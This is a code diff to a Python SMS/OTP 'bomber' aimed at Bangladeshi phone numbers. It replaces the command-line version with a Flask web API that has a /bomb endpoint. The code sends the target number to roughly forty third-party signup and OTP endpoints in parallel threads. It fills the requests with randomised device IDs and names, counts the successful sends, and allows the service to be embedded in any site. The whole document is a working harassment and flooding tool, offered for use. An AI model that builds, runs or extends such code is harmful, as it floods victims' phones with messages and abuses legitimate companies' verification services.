+    data = {"number": f"+880{number[1:]}"}
+    return send_request(url, "POST", headers, data)
+
+def process_number_api(number, amount):
+    apis = [api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_18, api_19, api_20, api_21, api_22, api_23, api_24, api_25, api_26, api_27, api_28, api_29, api_30, api_31, api_32, api_33, api_34, api_35, api_36, api_37, api_38, api_39, api_40]
     success_count = 0
+    results = []
+
     for _ in range(amount):
         pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
         egen = random_string("?n?n?n?n?n?n?n?n")
         did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
+        did2 = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i") # Added did2 for api_18
         name = random_string("?l?l?l?l?l?l")
+        
         with ThreadPoolExecutor(max_workers=10) as executor:
-            futures = []
-            futures.append(executor.submit(api_1, number, pgen, egen, did, name))
-            futures.append(executor.submit(api_10, number, pgen, egen, name))
-            for api in apis:
-                futures.append(executor.submit(api, number))
-            for future in futures:
-                result = future.result()
-                if result and result.status_code == 200:
-                    success_count += 1
-        time.sleep(1)
-    print(f"Successfully sent {success_count} requests to {number}")
+            futures_with_names = []
+            futures_with_names.append((executor.submit(api_1, number, pgen, egen, did, name), "api_1"))
+            futures_with_names.append((executor.submit(api_10, number, pgen, egen, name), "api_10"))
+            futures_with_names.append((executor.submit(api_18, number, did2), "api_18")) # Added api_18
+            futures_with_names.append((executor.submit(api_21, number, egen, name), "api_21")) # Added api_21
+            futures_with_names.append((executor.submit(api_23, number), "api_23")) # Added api_23
+            futures_with_names.append((executor.submit(api_24, number, pgen, name), "api_24")) # Added api_24
+            for api_func in apis:
+                futures_with_names.append((executor.submit(api_func, number), api_func.__name__))
+            
+            for future, api_name in futures_with_names:
+                try:
+                    result = future.result()
+                    if result and result.status_code == 200:
+                        success_count += 1
+                        results.append({"status": "success", "api": api_name, "response_code": result.status_code})
+                    else:
+                        results.append({"status": "failed", "api": api_name, "response_code": result.status_code if result else "N/A"})
+                except Exception as e:
+                    results.append({"status": "error", "api": api_name, "error_message": str(e)})
+        time.sleep(1) # Delay between batches of requests
 
-def main():
-    number = input("Enter BD number without +88 (e.g., 016...): ")
-    amount = int(input("Enter the number of requests to send: "))
-    threads = []
-    for _ in range(min(amount, 10)):
-        thread = threading.Thread(target=process_number, args=(number, amount))
-        threads.append(thread)
-        thread.start()
-    for thread in threads:
-        thread.join()
+    return {"total_requests_attempted": amount * (len(apis) + 6), "successful_requests": success_count, "details": results}
 
-if __name__ == "__main__":
-    main()
+@app.route('/bomb', methods=['POST'])
+def bomb_api():
+    data = request.get_json()
+    number = data.get('number')
+    amount = data.get('amount')
+
+    if not number or not amount:
+        return jsonify({"error": "Please provide 'number' and 'amount' in the request body."}), 400
+    
+    try:
+        amount = int(amount)
+    except ValueError:
+        return jsonify({"error": "'amount' must be an integer."}), 400
+
+    if not (1 <= amount <= 100): # Limit amount to prevent abuse and Vercel timeouts
+        return jsonify({"error": "'amount' must be between 1 and 100."}), 400
+
+    # Run the bombing process in a separate thread to avoid Flask timeout for long-running tasks
+    # For Vercel, long-running tasks are problematic. A better solution for production would be a message queue.
+    # For this example, we'll run it directly and acknowledge potential timeouts for large 'amount'.
+    
+    # You might want to run this asynchronously in a real production environment
+    # For Vercel, a synchronous response is expected within a short timeframe (e.g., 10 seconds).
+    # If 'amount' is large, this will likely time out.
+    # A more robust solution would involve a background task queue (e.g., Celery) and a separate endpoint to check status.
+    
+    # For now, we'll just execute it directly.
+    try:
+        result = process_number_api(number, amount)
+        return jsonify(result), 200
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+        return jsonify({"error": f"An internal server error occurred: {str(e)}"}), 500
+
+@app.route('/')
+def home():
+    response = make_response("Welcome to the Bomber API! Use the /bomb endpoint with a POST request.")
+    # Allow embedding in iframes from any origin
+    response.headers['Content-Security-Policy'] = "frame-ancestors *;"
+    return response
+
+if __name__ == '__main__':
+    app.run(debug=True)
